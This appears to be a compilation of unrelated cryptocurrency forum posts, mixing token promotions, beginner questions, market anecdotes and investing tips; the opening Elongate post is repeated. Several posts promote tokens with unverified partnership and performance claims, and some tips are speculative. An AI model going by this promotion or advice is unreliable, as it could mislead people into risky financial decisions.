They have partnered up with Mrbeast and Mark Rober to raise 30 Million to clean our oceans. They have also partnered up with EB research and will feature in Ventureforcures event on 18 Novermber with Tom Holland.

The team is very active and transparent. What do you guys think?

One of the main reasons that I was drawn to crypto was because of anonymity and decentralization of info. However, as I'm trying to setup an account on various exchanges, they require outrageously confidential personal info like a social security number which seems like the exact opposite of what crypto is promoted as.. For many reasons, I don't want my social security number, drivers license etc. stored on ANY website. How can I buy and own crypto without coughing up this personal info? Are there smaller exchanges that don't require this? Or workarounds to not have to use an exchange?

I live in the US and am mostly interested in trading smaller names.

I've seen some people lately discussing "wife-changing money" and wondered what that actually means. So I've done a little digging for everyone, so you know when you have made enough crypto gains to cash out and consider it wife-changing.

&amp;#x200B;

Step one is divorcing your current wife. According to Business Insider, the average divorce in the USA costs as much as $15k per person. Obviously this depends on a lot of factors such as how many shared assets you have, if there are kids involved, and whether or not the divorce is contested. However, we are just gonna go with $15k, plus an additional $5k to hide your crypto gains. If your wife knows about and can go after your crypto, this step will be a lot more expensive. 

&amp;#x200B;

The next step is finding a new wife. This is a multi step process that starts with self betterment before getting into courting and dating your future wife. Part one of this step isn't that expensive, all you is a gym membership, some new clothes, and probably some cologne (you are a redditor, so maybe you've never heard of this before, but it makes you smell nice). We can estimate this at $3k. Then is the dating which will be several months to a few years of dinners, dates, and gifts. We can estimate this at around $10k assuming a 2 year dating period, a nice dinner every other week, and gifts for valentines days, birthdays, and anniversaries. 

&amp;#x200B;

The last step is the marriage itself. Using averages from "The Knot", the engagement ring will cost about $5k, the wedding will be $25k, and the honeymoon will be $7k. Obviously, these are very loose estimates, but its the best we can do given the general nature of this discussion.

&amp;#x200B;

Adding everything up, we get $70k to achieve "wife-changing money" status. Honestly, it's not as much as I was expecting; I think that many of us could achieve it. Of course, you might not even want to get a new wife, in which case this is just a nice amount of money. But I think it is a good benchmark for success nonetheless. Thank you for listening.

If you are here you are into crypto coins. and that means you know that just in march things are simply skyrocketing. today PayPal accepted crypto, Twitter banned axie infinity account and multiple crypto educators, visa made yesterday their first ethereum transaction... things are GOING FAST.

Today was checking Earn from Gemini and it says 7% interest in filecoin. it says on their website put 10k and in 4 years you could have 3k+ in earnings, which is a lot compared to FIAT investing.

Many entrepreneurs like me, would see that and immediately say... I can take 10k start some business and make 2$ -4$ a month...

I have seen all the blockchain games so far and they honestly suck, by next year EA, Bethesda, and many AAA game developers will be jumping in. they are so many actual businesses made in the blockchain literally is a whitepage in history we are seeing right now. and we are the few that eve know about this.

I would suggest that take 1 minute out of looking at crypto news and checking your binance wallet and think

**what could you do with blockchain tech? what dapp could be really nice right now?**

Looking for guides how to start  dapps and services in the blockchain.

My good friend who has been successful with his own finances and investments pitched the point that all these massive crypto gains contribute to inflation in the fiat world.

I'm not an economist and can't say I have a valid rebuttal. I'm more of a tech visionary guy.

Does anyone have some good source information on this topic?

I spent 20 min googling but I'm not finding any info on the topic. Most of what I am finding is talking about inflation-deflation in cryptocurrency but not the effect of gains on inflation in the fiat world.  


Hoping to be able to read some decent analysis and share with my buddy. Eerrrrrrm, let's see if I can make the 500 character limit :)

Thanks!

I wanted to buy an alt coin from PanCake swap. I spent a week figuring out how I could do it. Finally pulled the trigger today.  


1. Got [Crypto.com](https://Crypto.com) app - Funded it with $50 
2. Got Trust wallet 
3. Bought Binance $48 worth? No loss here.
4. Transferred Binance to trust wallet (Now worth $26?)
5. Converted Binance to SmartChain so it would show up in my Pancake wallet Now worth $23
6. Swapped my $23 I have left for $18 worth of shitcoin because of "gas estimates?"
7. Have $4 left in SmartChain   


First of all - what the fuck am I doing wrong? Anything?   
Second of all, the only place I can see my shitcoin is in my "transfers" on trust wallet... It says I swapped for $18 worth of said shitcoin.   


Is it going to show up anywhere in my wallet so I can easily check it? Orrr...   
This is by far, the dumbest thing I ever put myself through

You can also read the following article on [Publish0x](https://www.publish0x.com/crypto-gateway/the-loopring-protocol-what-s-the-hype-about-xjoxdkr). 

# [A well-established Protocol](https://loopring.org/resources/en_whitepaper.pdf)

According to the official website, *this protocol is an open-source zkRollup protocol.*

Lets unpack it. First, lets understand Zero-Knowledge proofs. In a nutshell, a zero-knowledge proof is a method by which one party (the prover) can prove to another party (the verifier) that a given statement is true, without conveying any information apart from the fact that the statement is indeed true. This sounds paradoxical and even impossible, but with some clever mathematics, its very much possible, and its the working principle behind tokens like MINA protocol and Z-Cash. For example, a zero-knowledge proof might enable a government agency to verify that you are above the age required to access a website, without revealing your exact birthdate.

Heres an article by [CoinBureau](https://www.coinbureau.com/education/zero-knowledge-proofs-zksnarks/) explaining it in detail.

So what does this Protocol do? It allows the creation of decentralized exchanges. It provides a set of Ethereum smart contracts and zk circuits to provide an open standard, on top of which you can build any Crypto DeX or even a payment app. In some way, it's like a blueprint to make a decentralized exchange like PancakeSwap or ShushiSwap. So how is it better than the existing solutions? Well since it uses ZK proofs, it makes it highly secure and highly scalable. Remember, in ZK proof one party can prove a contract has been carried out, without even releasing the details about it. That's the reason it's so secure and anonymous, and that's exactly why ZK proofs are used by ZCash too.

# Tokenomics

* ERC-20 Compliant: YES
* Total Supply-Fixed:  **1,375,076,040**
* Token Address: 0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD
* Proof-of-Stake
* [More Details about its Tokenomics](https://medium.com/loopring-protocol/lrc-tokenomics-v2-1e6fd99e9e9c)

# Transaction Speeds and Scalability

This well-established protocol also aims to solve a **MAJOR** problem with Ethereum: Gas fees &amp; scalability. It has extremely high throughput, that's because the payments and the transactions are processed in batches "off the Ethereum main chain", so they are lightning-fast (pun intended), all while maintaining the Ethereum level security. As a result of all this, there are near-zero gas fees for trading any crypto or adding liquidity. Also, this protocol has a fairly high throughput of **2025 TPS**.

# Summary

So, all-in-all, this protocol seems to be a promising crypto project, which can potentially create a much-needed integration between the decentralized exchanges, significantly increase the retail money &amp; participation in DeFi projects by nearly eliminating gas fees, and decreasing transaction times. With a relatively low market cap and a potential partnership with GME, this project seem to have solid fundamentals to grow both in the short &amp; long term. That being said, it might face competition from other projects and ecosystems in the DeFi space, and even other L2 solutions that scale-up Ethereum. So will this project become the de-facto DeX protocol? Only time will tell.

Solana now claimed the number 5 spot by MC

Diving deeper here are what I think are the top projects on Solana

&amp;#x200B;

 

* **Star Atlas Game**  
Star Atlas is a  competitor for Axie Infinity, promising to provide a triple-A gaming  experience and offering supper high-quality cinematic game visuals.  Earlier this year they released the triple IDO (Initial Decentralized  Offer) which sent this network and Atlas, the in-game currency and  POLIS, the governing token around 150 times higher. But star atlas has  much more potential. Star Atlas can be described as a combination of NFT with the gaming industry using the concept of the  metaverse.  
The idea is to monetize the time spent playing the game. Gamers can collect NFTs and sell them for real cash in the Star  Atlas marketplace. This ecosystem comes with a deflationary mechanism,  by losing your NFT spaceships if you engage and lose in a battle. 80% of  the Atlas tokens will be rewarded to successful players, while after  selling 20% of the Polis coins, the rest will be distributed to the DAO.  You can also lend both tokens on different pools on Radium, which is  the next top Solana-based project.
* Raydium  
Raydium  is a market maker just like Uniswap built on Solana. It has the highest  TVL (Total Value Locked) on Solana with $12.6 billion. What makes  Radium stand aside is the fact that the other DEX and DeFi  (Decentralized Finance) suffer from two main issues: one, most exchanges  are based on the Ethereum network which means network congestion and  high gas fees, and two, and they can access liquidity only within their  pools.  
Raydium can overcome these challenges by incorporating  Serum on the Solana blockchain, which is the first AMM (Automated Market  Maker) that optimizes the speed of the Solana network and the DEX limit  order book, meaning endless liquidity supply, friction less yield  farming and speed token swaps. With the Serum connection from Raydium,  the whole Solana Ecosystem gets access to more liquidity. The average  all-time high ROI for the IDO is at 5,000%, while RAY which is the  native token has had a great performance in recent months.
* ORCA  
ORCA  is a DEX where the TVL has exploded recently, reaching $1.11 billion.  It is a pure AMM DEX on Solana, which encourages users to:  

* **Swap**   Orca users can use its own pool and unlike Raydium and does not use  Serum as a source of liquidity and they can tap on liquidity pools as  well. Similar to AMM, LPs (Liquidity Providers) can provide liquidity to  Orcas pools, which can receive parts of trading fees as  payments/interest.
* **Yield Farming Programmes**   Aquafarms is one of these programmes, which offer users a number of  liquidity pools, which can become Acqua farms-Yield farms. ORCA enables  users to earn trading fees from participating in these farms and ORCA  tokens. Orca has an auto swap as well.

I am happy to have bought some of the smaller altcoins when they released on CB. They seem to be doing most of the pushing in my portfolio atm. 

My current breadwinner is Jasmy, which has really packed a punch the last 24 hours. Though I would like to see some more action from ALGO!

Which of your coins are doing best right now?

|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

When I bake I like to imagine the eggs are being forced into a battle of life or death in the mixing bowl arena. The yolks who crack on impact with the other ingredients lose. The winner(s) gets to bathe in the yolk of their enemies before being eliminated by the whisk.

Sorry about that, needed something for the character limit.

I don't think I'm allowed to post links to Twitter pages because they never get approved. Check out Casper's Twitter page. 

Here's a quick description - 

Are you still waiting for ETH 2.0? Casper is ready for you to start building now! Find out why some have called Casper - ETH 3.0

Check out the link to learn more. I don't think it's shilling in a bad way when you post a thread about an asset that is this strong and has this much utility and is this early. Sorry if anyone sees it that way. 

Also not knocking Ethereum at all. Casper is just ahead in the game.

How the biggest banks get away with fraud (hedge funds as well)
https://youtu.be/FSh8eusFYL4

All the fines &amp; investigations you hear about from time to time are just smoke to distract ordinary people from the corruption &amp; blatant stealing if tax payer money.

If SEC or other regulatory body want to be fair, their punishment for banks should fit or exceed the gains they made not to mention jail time which rarely happens.

If the entirety of the SEC staff are ex bankers how do you expect them to be fair or unbiased?

 Hello Everyone! It's a great, green day/week/month/life in Crypto!

What if, you could play a Virtual Fishing Game that is well developed, with NFTs to show your ownership, various events and leaderboards for community participation, AND help save the OCEAN by playing the game? I present to you, AlgOcean Project.

Yes it's another Algo related post, but at the same time it's not. I am not an Algo Maximalist, but have just found their ecosystem extremely easy/efficient for use and the community has been fantastic.

&amp;#x200B;

**INTRO:**

We are a team of 3 (Me, the Artist Jiro, and the DEV Chris). I met Chris outside of crypto and he agreed to work on this project with me. He is a genius who has actualized the AlgOcean Discord BOT and continues to develop it in ways I didn't even know was possible. Jiro is a master pixel artist that I also met outside of cryptospace.

&amp;#x200B;

**DISCORD:**

We just finished our Test-Beta (Just gameplay and no NFTs). It was completely free and people could fish as much as they want. We are glad and proud to say that we didn't find any glitches or major setbacks. We were also able to get valuable input/feedback and have applied them to the project. The BOT is fully functional and capable of handling thousands of commands with very compact data.

Some of the things that are not in the whitepaper below are that we've also added in leaderboards according to biggest fish, highest overall score, and highest score fish caught as well. There's also going to be 'roles' and 'titles' according to the # of different fish caught. We also have AlgOcean Coins (AOC) but that'll be explained more further down.

Discord invite link is in my other post in other sub.

&amp;#x200B;

**BETA-X:**

Yesterday we started the BETA-X phase where people could buy fishing tickets for 0.1 Algo (around 0.18USD). The NFTs are still getting ready and won't be linked until the official release, but the rewards during this time are in AOC coins, other NFTs, and promises of various Perks post-beta like increased probabilities, free fishing tickets, etc.

We currently have a little over 200 members in our community and would love to see it grow.

Discord links are not allowed so I'll see if I can add it in the comment.

&amp;#x200B;

**VISION:**

Before talking about the AOC Coin, here's the primary vision we have for this project. I have been involved in Wildlife Rehabilitation first-hand and through donations for many years and with this Project we would love to be linked with Ocean Conservation. At this point, we have reached out to a few Ocean Conservation/Charity Organizations and are waiting for their reply. As soon as I can get our team compensated for the work they've been doing for weeks, we are setting aside a significant fixed % of all future earnings for Ocean Conservation (like the Ocean Cleanup). But more than that, we want to introduce (AOC) coin along with this vision.

You are saving real life fish by playing virtual fishing game.

&amp;#x200B;

**AOC Token:**

AlgOcean Coin(AOC) is an ASA on Algorand Ecosystem with max cap of 10 Billion (matching Algo's). We are still discussing and reaching out to more well-versed individuals to actualize the specific Tokenomics. We have started distributing AOCs in various ways through Twitter, through our BETA-X as rewards, and other means. We are going to get this listed on Tinyman (Decentralized Trading Protocol on Algorand) eventually with imbued values that will be linked directly to Ocean Conservation Donations. So stay tuned for this.

&amp;#x200B;

I still don't quite understand how rugpulls work so successfully. Good companies take a long time to establish and build value, which big money can be made within a week or launching a rugpull. It might take more time, but rugpulls generally happen quickly. How exactly do these rugpulls work and how are they so successful? 

How do the people behind the rugpulls know which trends to follow and get people to fall for the hype? It would be helpful to understand how these rugpulls are created since they manage to end up working. Finding the victims is a very interesting part of the process since they have to make sure there is a market out there to fall for it. Otherwise, all that marketing would go to waste. 

Even when it's an obvious scam, people still fall for it. Knowing the process behind creating these thing would be helpful because it would make it easier to identify. Some guide can provide some value here as to how the people creating the rugpulls do it.

Just as a disclaimer. I only hold the projects I really believe in. There was a time where I would like to go gamble at the casino with money I know I could loose. But this is so much more fun than the casino.

I am constantly online like many of us searching &amp; lurking. Sometimes I see a new listing or a project way down  percentage wise so I do a bit of research. If it sounds solid enough I say duck it and throw some gambling money in it. 

Thats why I started an individual ShitCoin Portfolio &amp; a Maybe Portfolio. Now these portfolios have outperformed some of of my other long term portfolios in short term (shit coins dont have much of shelf life) but I know long term it wont compare.

At the moment I am out of words with DREAMS just listed ( I think?) on KuCoin &amp; I am up an insane amount with a very small investment. Token info seems solid given the hype but still amazed.

Anybody else practice the same tactic? Im sure. So what are your stories? How have the gains or losses changed your perspective on the space? If you dont mind sharing; which ones? 

I never put anything in Squid. It was an easy no to me but maybe here we can bring perspective to those not as well versed in this fairly new space. I believe its almost the responsibility of the community to spread the best information we can, even to gamblers. This can individually change the whole mentality of a gambler to believe in the future of currency.


Edit: Cant say for sure how legit this project is but given what its involved with you never know. This is what the Token Info says about DREAMS. If anyone can shed light Id appreciate it as I am taking profits slowly just in case it blows up even more.

Dreams Quest is building the first-ever metaverse-based economy, a self-sustaining DreamsVerse where people will be able to participate in the decentralised play-to-earn RPG game using dynamic NFTs. Unknown factors will affect character attributes in-game, and post-game outcomes will dynamically change the NFT card attributes and write them on the blockchain (the ethereal scribes) to show game history for each card.

Since we're kind of in the beginning of a bull market, I am curious and have been wondering about if some of us here are lucky enough to have their portfolio reached their desired amount some day in the future perhaps in the near 1 to 5 years period, your total portfolio of cryptocurrency inclusive of capital and gains reach your desired amount, will you be cashing out and investing in other assets other than cryptocurrency? If yes, what would that investment or undertaking be and why? If no then what would be the reason for not doing so?

I think the introduction of Moons was a cool idea, tipping those who you see fit for their perspective/mind-set essentially. It's grown from that as far-off dreams of hitting the mainnet now are an eminent reality. 

This 'time of the month' the sub is flooded with posts telling people to open their vaults. 

Now do I want people who contribute to this community (in any way) to earn Moons? Absolutely! 

Thing is, you see posts on what they are and how to open your vault and really explaining the whole situation, including how they expire after 6 months of being unclaimed. 

If you're active in this sub for atleast a week or two, with no open vault, I'm going to go ahead and assume you don't care about Moons, and that's cool too.

The unclaimed Moons become lost forever, increasing the rarity of them. I'm sure you see how this would positively affect price now and certainly in the future. 

TL;DR  With all the talk about Moons/Vaults it's hard to feel bad for people's unclaimed Moons. They become lost forever &amp; increase the value for people who took the initiative.

My portfolio was already a good size before this years crash but I was adding to it during the lows and buying coins I thought would do well in the next bull run.

Now, with the recent pumps of so many coins and reaching ATHs on Bitcoin and Ethereum my portfolio is literally at an ATH making me the richest Ive ever been.

The problem is, Im the poorest Ive been in a long time in terms of **actual cash**. Most of my wealth is in crypto and I dont want to sell because I think were still going higher.

So while I get to look at the beautiful numbers in my portfolio, I have to live like a poor man in real life for now.

Has this happened to anyone else recently?!

Hi guys,

What do you think of Elongate? 

Its a project that exists since March. They aim to be the bridge between Crypto and Charity. They have also donated almost 4 million toward Ending world hunger, cleaning the oceans, cure EB research, Kimbal Musks charity Big greem, India for helping out with Covid and many more.

Recently they have announced a whole ecosystem which includes a partnership with Salesforce to incorporate crypto in its users transactions where all of it would go through Elongate and raise money for charities. The app is being set up and will be ready in a few weeks.

They have partnered up with Mrbeast and Mark Rober to raise 30 Million to clean our oceans. They have also partnered up with EB research and will feature in Ventureforcures event on 18 Novermber with Tom Holland.

The team is very active and transparent. What do you guys think?

A month ago I posted that I was doing research on smaller layer 1 blockchains. Here is the first of around fifteen posts that contain my research. Here is the first - I will try to post one per day for the next 15 days. 

The thought behind this project is that I want to get onboard the next FTM or SOL early and I assume many of you do too. To that end, I will not be posting 'recommend' or 'don't recommend' but I will be telling you whether my research led to me purchasing the asset in question or not.

**Bytom (BTM)**

**Overview:** Bytom is a smart contract-enabled blockchain project that is developing a protocol to combine multiple assets into one blockchain solution. The aim is to facilitate the exchange of warrants, securities, bonds and a wide range of other digital assets between blockchains.

**Coingecko Market Cap as of writing:** $88,981,958

**Market cap ranking as of writing:** 516

**24h volume (as of writing):** $10.4m

**Country of origin:** China

**Consensus model:** PoS

**Explorer:** [https://btmscan.com](https://btmscan.com/)

**Whitepaper:** [https://cdn.bytom.io/res/WhitePaper-Bytom%202.0-en.pdf](https://cdn.bytom.io/res/WhitePaper-Bytom%202.0-en.pdf)

**Website:** [https://bytom.io/en/](https://bytom.io/en/)

**Team doxxed?:** No

**How distributed is supply?:** The top 100 addresses control 1.44b of the total 1.71b circulating supply

**Notable projects on network:** The only project I could find on BTM that looked legit is mov.network which is a series of defi projects. There is one other project listed on the BTM page that is completely in Chinese and does not look super hashed out.

**Pros:** 

 This project does look like a lot of thought went into it. This is the second iteration of BTM; v1 was a PoW project with PoS sidechains. The whitepaper is useful and does not contain any questionable mechanics I could find.

 Anyone wanting to use BTM speculatively does have that option through its defi project mov.network

 Low gas fees due to PoS

 NFTs are cheap and easy to make on mov.network

**Cons:**

 Undoxxed team

 Btmscan.com looks buggy

 Centralized supply is always a big concern

 I am usually somewhat wary of Chinese projects simply because I dont know how China will regulate them in the future

**Disclaimer:** I do not own any BTM at this time nor have I ever owned BTM

Until a couple of months ago I was massively sceptical of crypto, the scepticism was based on no evidence or research at all! 

Then I watched cryptopia and looking into it all. I still struggle to understand a lot of it, I'm not the sharpest knife but I have started putting a small amount into crypto each week with the aim to have enough money in a few years to get some much needed dental implants and swim the English channel! 

I understand my investment can go up and down, but  glad I got involved!

Been investing in crypto for few years.   
But after 2020 hype what i am seeing is people most of time investing random coins just because of Hype some random celebrity created .
After Seeing 2x 10x 20x gains and than putting everything they got and  getting rug pulled  losing all their life savings there are many examples recent one is SQUID GAMES token . 
Without doing any research about the project the coin they are buying or  even  without knowing why its pumping or dumping. T.A and F.A is far fetched for them. 

Investing in a coin just because some random People /Telegram group/ Youtuber told them and got some gain and thinking They are SOME EXPERT CRYPTO TRADER .  and after few days losing everything in some random pump and dump. And Why the fk people going full on lev mode without knowing risk.?
 
What i think if this keeps going on Long term it  will be  bad for retail crypto invester and once again it'll become  DIGITAL WALL STREET .. 
I mean everyone here is in for gain . But what people looking for quick gain and a 5% 10% gain for them is slow market. Which is increasing Greed and their Risk .that is much more dangerous.  For example when market fell 10% people start panic selling and  saying bear market started but when a good coin goes up by 10 % they think market is dull slow and dead.   just take example today ETH broke 4500$ but nobody is talking because its not 2x gain . 

So what i want to know is 
1.why are you here.?? Before trading do you dyor.??

2. Or just invest any random shit coin because   its trending .??

3. Do you think if same situation keep going on  institutional  invester will make crypto another Digital WallStreet.?

4. Do you have any personal stories  experience on above topic you would like to share.??

So I've been very vocal in my circles of friends about how you don't need to buy courses from fake gurus and all that in order to learn about crypto. I know that I didn't need any course.

 So rn I am in a position where my friends are actually listening, but since they are complete beginners also working 9 to 5 jobs they can't do all the research by themselves and have the required time to delve deeper into the depths of crypto and if I just straight up share with them links from stuff that I'm reading now, they will just run tot the hills. 

So I guess my question is if anyone can recommend something that I can further recommend to complete beginners, people that only want to dca some money on the side. Im guessing I need smth that explains how fundamental analysis needs to be done, TA I think that's already way over what these people need at first.

The biggest takeaway is this... crypto investing is a Tortoise game, not a Hare game. Many are here because they want to be the Hare. They heard about crypto from their Hare friends or saw the quick 3 and 4 digit ROI's and jumped into meme coins or started day trading. That's not the long term play and it's not the safe bet. I know a few Crypto Hares but I know more Crypto Tortoises. Hares lease Lambos and start YouTube channels. Tortoises are buying businesses, investing in commercial real estate and are building generational wealth but you'll never know their names. They stay private.

I put 5 grand in, 4 years ago today and it's been a ride to say the least. I've day traded, I've mined, I've been up 50k in a day, I've lost a year's worth of salary "value" on a bad day. I've been down to hundreds in my portfolio and I've had my portfolio ATH approach 7 digits. I've seen some shit.  


Here's what I've learned so far.  


* DYOR - Research the project and research the team. Learn how to look through a Github repro and see what developers are talking about. Attend in-person or virtual conferences and learn about the project and their roadmaps (are they hitting milestones?). What does it solve? What are competitors in the space doing? Who is backing the project, either financially or with leadership experience? What is the team's past performance at their previous jobs (I'll go down LinkedIn rabbit holes and have found complete fabricated companies in some bios of devs and founders).
* Day Trading - Most of you, will lose your ass in day trading. You will not be smarter than the market. EMA200's and RSI's are easy to read, even for the novice. You're going to think you cracked some code and you're going to work out what 8% daily returns are going to yield you. My God, you're going to be a millionaire in a few months according to your corny ass excel sheet. No, you're going to get your face smashed in by a giant red dildo in the middle of the night that immediately reverses, but don't worry, all your stop-losses got triggered and now you're buying back in, down 30%. I have a degree in Finance and I'm a 20+ year data analyst for my day gig at a High-Net Worth financial firm. Even I don't day trade anymore.
* Don't pay to join a pump and dump or trading group. They're typically scammy and when the price rises from your collective buy-in's, you're usually buying the leadership of the group's sell orders.
* Look for black swans. I put a few extra shekels in during CoVid when shit got real bad. I bought a stack of ETH at around 190 ETH/USD back in Feb/March of 2020. I should have Yolo'd 30k into it but you live you learn. I'm looking for more black swan events though.
* Throw a few bucks more than you're comfortable losing. It would suck to lose 5,000 of my original investment but frankly, my lifestyle wouldn't change if it went to zero. The first 10x is always the hardest and I would rather start with 5,000 instead of 500.
* Distribute your investments wisely. You stack shit coins and alt coins to increase your BTC stack, that's it. Focus on the BTC stack. I hold 40% BTC, 20% ETH and the rest in a few alts... don't hold more than 10 assets total but I keep my eye on the BTC value of the entire portfolio.
* For your alts, pick an exit target and size and GTFO when you hit. You didn't buy all at once so don't sell all at once, stagger those exits. That said, never pull all of it out. I always leave around 10-15% in because who knows what will happen. If you're going to sling shit coins, I'm usually looking for 20-30% ROI and I'm done. I'll get my multi-x gains on the longer term holds. So many times have I been left holding the bag chasing crazy gains.
* Cold Wallets - Get your shit off exchanges. If you want to leave 10-15% on there to have available that's fine but don't leave your entire stack on an exchange once it starts to be an "uncomfortable" amount of money for you.
* Keep your OpSec in check and constantly look at security as your value grows. Don't talk about crypto to people outside your inner circle. There are 4 people that know I have anything in Crypto. My wife of 15 years knows about my Crypto because she needs to access it if something where to happen to me so my house gets paid off and the kids have a college fund. I have a crypto-god father that knows the kind of stack I hold but doesn't know my keys, location of my wallets or passphrase. We have an agreement that if something where to happen to me, he would help my wife liquidate and vice-versa (she would do a wallet a week for 6 weeks, never all at once). Test your backups. Keep your seed phrases split with redundancy but not all in one place. I can restore my wallets with any 2 out of 3 metal stamped cards I made. I've also split my assets across several cold wallets. This doesn't make sense with a few grand in crypto but once you start hitting 6 digit hell, increase your security.
* Pay your taxes. Seriously, pay your damn taxes. They'll lock your ass in a cage for not paying your taxes. The majority of what I have sold so far has been long term gains and I was able to show this with great documentation. I would be iron clad in an audit.
* When you feel like you should sell because you're all depressed about the lack of price action or a black swan event happening in the world (see above), you should buy more. When you feel FOMO and want to increase your position because of hot price action, it's time to sell a little. This has never let me down.

Thanks for reading and best wishes to you. This can change your life if you're patient.

When I started investing in crypto initially it was with the goal of catching The Next Bitcoin. my brother had told me about bitcoin several years ago and it was trading for less than one dollar coin and I felt like I had missed out because I didnt take advantage of that info. In fact I distinctly remember stopping mining bitcoin because I thought it was slowing down World of Warcraft lol. One of my first revelations was that even if I had purchased bitcoin back then odds are I wouldve sold it multiple times over by now. Probably at each all time high. That realization has helped me to let go of the fantasy of crypto moon shots and avoid pump and dumps. 

I used to get excited every time I see one of my favorite projects up 50 to 100 percent, but now Im just disappointed that It didnt stay down until Friday so I could scoop more. The differences I have come to realize that cryptocurrency is in fact the future. Its what everything is headed towards (revelation 2).

The last thing I want to address is the idea that were too late to see any significant returns. When I am at work and talk to all of my very well educated professional friends 5 of 20 understand the term Cryptocurrency. 3 of 20 have actually done research on it and all 3 are invested and trading. Now, of those 3 none understand hard/soft wallets and have ever experienced loosing crypto to an incorrect wallet transfer. Theyve only traded
On secure apps they already trade stocks on. This shows me that we are still in the age of early adoption. 

So all in all what Im trying to say is if you believe a project has a future, support it. Theres a long ways yet to go. May the odds be ever in your favor

What are some upgrades, listings on exchanges, halvings, court dates and other major events that could really affect a coin's future? 

I think this could actually help everyone make more informed decisions with their investments.

I was often caught by surprise after making a choice and wished I'd known those things before.

It's obviously impossible to read every news article there is.

So what are major events that are happening with the different crypto currencies in the near (or far) future?




Let's help each other.

Hey everyone. I am new to cryptocurrency and looking to make purchases into Bitcoin and other coins as I wish. I am familiar with trading as I have traded stocks for many years. What website or app would you recommend that I use for trading? Coinbase? Coinbase Pro? Kraken? Binance? Any others? 

I already have an account with Coinbase and Coinbase Pro but dont really know the difference between the two. Do both use Coinbase Wallet to hold the coins? 

Any suggestions are welcome as I am very unfamiliar with all of this, but interested in learning as much as I can!

I have been using Coinbase for years to make small trades. Buying various cryptos and stuff. The payment method used was various debit cards.
For the record, I am in the UK.

Starting today when I login to Coinbase I get a message asking me to verify Payment Method. Clicking this button tells me to:
&gt; Use these details to transfer a small amount of euros from your bank account to Coinbase to verify your account. Once verified, you can cash out or add cash to this account.
Make sure the name on your bank account exactly matches your name on Coinbase

I'm not sure why I am getting this message because
1. I can't send Euros because I am in the UK
2. I just need to update my debit cards because they have expired. 

Has anyone any idea why I am getting this message. How I proceed from here and if it's possible to just update debit cards?

Thanks in advance

And if so, what crypto did you use? How was your experience?

If not, is it because you're speculating? Ease of use? Something else?

Personally over the years I've bought stuff with Bitcoin, Bitcoin Cash, Dogecoin and Monero. No regrets.

Monero definitely my favourite. Apart from the privacy aspect, the fees are ridiculously low and transactions very fast.

I know it gets shit on a lot (and I don't hold any) but for purchasing I found Dogecoin easy to use, fast and low fees.

BCH I found similarly fast and cheap. Bitcoin fees make it unattractive for day to day purchases to me but its obviously more widely accepted. Eth I consider a fantastic project but is an absolute no-no for purchases with the gas fees (for now / to me at least).

Ive been doing really well with my crypto investments lately and Im pumped! 

But whenever I (excitedly) tell her about it, shes like you should sell it or have you sold it. And Im like well no, Im a diamond handed ape and Im hodling until I have enough to retire from the soul sucking monotony of 9-5 corporate life. And then shes like well then you havent really made anything then have you? or What if it all goes back down?. Then Im like damn, shes got a good point there. Then I fall into a spiral of worry and self doubt lol

Does anyone else have this problem with partners/friends/family?

With Ethereum hitting new aths and Bitcoin looking like its about to do the same its hard not to believe the next leg of this bull run is about to take off. If that is the case I think its important to think about what were going to do when the market starts going crazy. When/what price do you plan to sell at (if at all) and where will you put your gains? Personally I plan to slowly switch my altcoin gains to btc and s&amp;p shorts (risky I know, but better than holding usd right now imo), Are there any assets, commodities in particular, that you see as a good store of value if the world economy were to take a serious hit? (besides btc). Basically where is the safest place to keep your money in this day and age excluding crypto?

You always hear about that random 13year old who invested in a dog coin for a laugh and now is a millionaire - but you never hear about the countless amount of people who have been scammed and tricked into loosing their money. 

My father - who knows little of the space sept that I invest slightly - messaged me today and told me to Google squid crypto in a polite manner, to warn me of potential scams.

So maybe this recent rugpull will change narratives - maybe we can reference squidpulls in the future.

Because that's what I feel like right now. Bought ELONDOGE, saw it dipping and panicked, converted to LRC, and lo and behold! LRC is dipping too, and I'm sitting here fidgeting like a crackhead wondering what to do next. Insult me: it's what I deserve. But how, for the love of God, can I learn to be more mature about all of this? Because I'm not making *any* good decisions here; I'm mindlessly buying into the first crypto I see mentioned postively twice or three times on this sub, I.e., I'm usually buying in at the ATH. Damn my brain - how can I fix myself? Many thanks.

When I have something jump up huge, I just sell 10% and diversify, buying others that are in a low. 

I own over 75 different crypto currencies. 
35 of which I have over 1 billion of...some I have a quarter trillion.

Here's some context for my background, and maybe why I am this way.

I grew up lower middle class, dad always bitching about money, it was the fixture of my childhood. 

Went though a rough patch in life, thats really not important to my point, but let's put it this way, I was college grad working minimum wage, doing demolition work in queens, periodically living out of my car. Dirty punishing work... reflected how I felt about myself inside really.

In the back of this work van, one winter day in January 2019, I had saw that robinhood had recently allowed for dogecoin trading. I remember thinking, "fuck it, I've lost more in a casino in a night." and purchasing 150,000 doge for roughly 190$. 
I didn't know it then, I didn't know it a year later, but it was a decision that would change the course of my life. 

In time, I peeled off profit to live, and diversified a good amount where I now have a massive and diverse portfolio of many many altcoins.

People ask me why I don't pull out, but they REALLY don't understand what this is about. Its not about money anymore. This is about WEALTH.

I came from nothing. In my mind, I'm still there. None of this is real. Not until I am wealthy. Fuck your $50,000 USD. FUCK your $100,000 USD. 

Fuck the USD. 

This is about wealth beyond the terrible ass American system we've all come to falsely idolize. 

Ps. NEVER give up on your life.

Hi Im sorry if this is against the rules or frowned upon, but I read the rules to the best of my ability.

Ill keep it real short, Ive been in crypto for around a year and am learning more as the days go by. But what are moons? I earn them through Reddit right? And we can trade them as a community?

Can they be used for transactions? I know I could find these answers online but sometimes I struggle to understand. 

Thanks In advance :)

Quick edit:

Sorry if this is a repost, I screwed up the first one and didnt reach the character limit. I dont know if Ive reached it yet so Im hoping this rambling helps a bit

Basically every coin is mooning, (except for Cardano of course) but sometimes the price of a coin goes down. Which means that some people must hate money if they are selling right now.

But on a serious note, when do you sell? Because I got into some projects and I made more money in a week than I made in my life, but if I didn't sell, I would have made more.

So how do you get a good balance between taking profits and sitting on your hands?

By the way, you can make a shitload of money in the next couple of months, but only if you don't chase big green candles. Even XRP is pumping, so just wait with your projects and don't fomo in at peak prices. Let's make a lot of money!

In all the Memecoins/shitcoins craze, we forgot Bitcoin climbing back close to its ATH again, ETH touched new ATH crossed $4500 first time, BNB crossed $550 level first time after May! 

This month turned out really good for the whole Crypto market.'Uptober' is the word coined by Crypto enthusiasts before the start of October proven out to be true,as the investors are buying at ATH levels of the top Cryptos. 

